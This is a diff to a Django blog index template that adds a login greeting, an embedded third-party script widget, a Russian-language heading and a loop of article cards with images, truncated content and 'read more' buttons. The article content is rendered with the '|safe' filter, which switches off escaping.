@@ -2,5 +2,61 @@
 {% block body%}
 
 <h1>Index Page</h1>
+<div class="container">
+  <p>
+      {% if request.user.is_authenticated %}
+          Successfully entered {{request.user.username}}
+      {% else %}
+      {% endif %}
+      <script charset="utf-8" type="text/javascript" src="//tezbile.kg/iframe.js"></script>
+  </p>
+</div>
+
+
+
+
+
+<div class="container">
+
+
+        <div class="text-center my-5">
+            <h2 style="color:red;" class="fw-bolder">Блог: все интересные факты и статьи здесь!</h2>
+        </div>
+
+
+</div>
+
+
+<div class="row row-cols-1 row-cols-md-3 g-4">
+
+
+{% if articles %}
+    {% for article in articles %}
+        <div class="card">
+              {% if article.article_image %}
+                    <a href="{% url 'blog:detail' article.id %}"><img src="{{ article.article_image.url }}" class="img-fluid" alt="Responsive image" /></a>
+                {% endif %}
+              <div class="card-body">
+                <h5 class="card-title">{{ article.title }}</h5>
+                <p class="card-text">{{  article.content|safe|truncatewords:20  }}</p>
+              </div>
+            <div class="card-body d-flex flex-column">
+                    <a style="center" href="{% url 'blog:detail' article.id %}" class="btn btn-primary">Читать далее</a>
+                </div>
+        </div>
+{% endfor %}
+{% else %}
+    <div class="col-md-10 offset-md-3">
+            <div class="col-lg-8">
+                <div class="aler alert-danger">Пока нет статей</div>
+            </div>
+        </div>
+{% endif %}
+    </center>
+</div>
+
+
+
+
 
 {% endblock %}
